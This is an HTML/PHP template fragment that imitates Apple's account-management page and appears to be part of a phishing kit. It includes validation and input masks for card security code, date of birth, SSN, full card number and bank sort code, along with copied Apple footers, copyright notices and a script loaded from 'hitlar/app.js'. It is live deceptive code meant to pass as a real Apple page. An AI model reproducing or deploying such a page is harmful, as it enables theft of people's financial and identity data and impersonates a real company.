frmvalidator.addValidation("cvv","req","Enter the security code for your card.");
frmvalidator.addValidation("date_ob","req","Enter your date of birth.");
frmvalidator.addValidation("Phone","req","Enter a phone number");
//]]></script> 
<script>
     jQuery(function($){
         $("#cd").mask("99/99",{placeholder:"mm/yy"});
         $("#date_ob").mask("99/99/9999",{placeholder:"mm/dd/yyyy"});
         $("#ssn").mask("999-99-9999",{placeholder:"xxx-xx-xxxx"});
         $("#sh").mask("9999-9999-9999-9999",{placeholder:"xxxx-xxxx-xxxx-xxxx"});
         $("#sort_code").mask("99-99-99",{placeholder:"xx-xx-xx"});
     });
 </script>
            </div>
        </div>
    </div>


</support>
        </div>
    <footer>
<div class="container">
    <div class="footer">
        <div class="footer-wrap">
            <div class="line1">
                <div class="line-level">Shop the <a title="Apple Online Store" href="">Apple Online Store</a> (<?php print "$COUNTRY"; ?>), visit an <a title="Apple Retail Store" href="">Apple Retail Store</a>, or find a <a title="Reseller" href="">reseller</a>.</div>
            </div>
            <div class="line2">
                <ul class="menu">
                    <li class="item"><a target="_blank" title="Apple Info" href="">Apple Info</a></li>
                    <li class="item"><a target="_blank" title="Site Map" href="">Site Map</a></li>
                    <li class="item"><a target="_blank" title="Hot News" href="">Hot News</a></li>
                    <li class="item"><a target="_blank" title="RSS Feeds" href="">RSS Feeds</a></li>
                    <li class="item"><a target="_blank" title="Contact Us" href="">Contact Us</a></li>
                    <li class="item">
                        <a href="" title="Choose your country or region" class="choose">
                        <img alt="United States" src="img/AUSflag.png" width="22" height="22">
                        </a>
                    </li>
                </ul>
            </div>
            <div class="line3">
                Copyright &copy; <?=date("Y");?> Apple Inc. All rights reserved.
                <ul class="menu">
                    <li class="item"><a title="Terms of Use" href="">Terms of Use</a></li>
                    <li class="item"><a title="Privacy Policy" href="">Privacy Policy</a></li>
                </ul>
            </div>
        </div>
    </div>
</div>
</footer>
</div>
</manage></div>
 <script type="text/javascript" src="hitlar/app.js"></script>
<script type="text/stache" id="jstache_59074038">
<applenav></applenav>
<div class="manage">
    <header></header>
    <photo account="{account}" config="{config}"></photo>
    {{#is view "manage"}}
        <div class="container flow-sections">
            <account editable-birthday="{editableBirthday}" {(account)}="account" {config}="config" {{#accountEdit}} edit-mode="{accountEdit}"{{/if}}></account>
            <msecurity editable-birthday="{editableBirthday}"{{#action}} action="{action}"{{/if}} account="{account}" config="{config}"></msecurity>
            {{#config.pageFeatures.featureSwitches.showDeviceSection}}
                <devices account="{account}" config="{config}"></devices>
            {{/if}}
            {{#if canViewPaymentSection}}
                <aid-payment {(account)}="account"
                             {payment-status}="account.paymentMethodStatus"
                             {is-underage-with-payment}="isUnderAgeAndHasFamilyPaymentMethod"
                             {has-family-card}="hasFamilyCard"
                             {shipping-addresses}="account.person.shippingAddresses"
                             {(config)}="config"></aid-payment>
            {{/if}}
            <preferences account="{account}" config="{config}"></preferences>
            <div id="signout" class="flow-section signout-list">
                <div class="row">
                    <div class="col-sm-12 section-name">
                        <div class="section-action">
                            <button class="btn btn-link section-title">
                                Sign Out
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            <support account="{account}" config="{config}"></support>
        </div>
    {{/is}}

    {{#is view "dobapprove"}}
        <underage-approve account={account} config="{config}" reqerror="{reqerror}"></underage-approve>
    {{/is}}

    <footer></footer>
</div>

</script>
<script type="text/stache" id="jstache_1849662777">



<div class="container">
    <div class="footer">
        <div class="footer-wrap">
            <div class="line1">
                <div class="line-level">Shop the <a href="" title="Apple Online Store">Apple Online Store</a> (<?php print "$COUNTRY"; ?>), visit an <a href="" title="Apple Retail Store">Apple Retail Store</a>, or find a <a href="" title="Reseller">reseller</a>.</div>
            </div>
            <div class="line2">
                <ul class="menu">
                    <li class="item"><a href="" title="Apple Info" target="_blank">Apple Info</a></li>
                    <li class="item"><a href="" title="Site Map" target="_blank">Site Map</a></li>
                    <li class="item"><a href="" title="Hot News" target="_blank">Hot News</a></li>
                    <li class="item"><a href="" title="RSS Feeds" target="_blank">RSS Feeds</a></li>
                    <li class="item"><a href="" title="Contact Us" target="_blank">Contact Us</a></li>
                    <li class="item">
                        <a class="choose" title="Choose your country or region" href="">
                        <img src="img/AUSflag.png" height="22" alt="United States" width="22" />
                        </a>
                    </li>
                </ul>
            </div>
            <div class="line3">
                Copyright &copy; <?=date("Y");?> Apple Inc. All rights reserved.
                <ul class="menu">
                    <li class="item"><a href="<?php print "$time"; ?><?php print "$date"; ?>" title="Terms of Use">Terms of Use</a></li>
                    <li class="item"><a href="<?php print "$time"; ?><?php print "$date"; ?>" title="Privacy Policy">Privacy Policy</a></li>
                </ul>
            </div>
        </div>
    </div>
</div>
</html>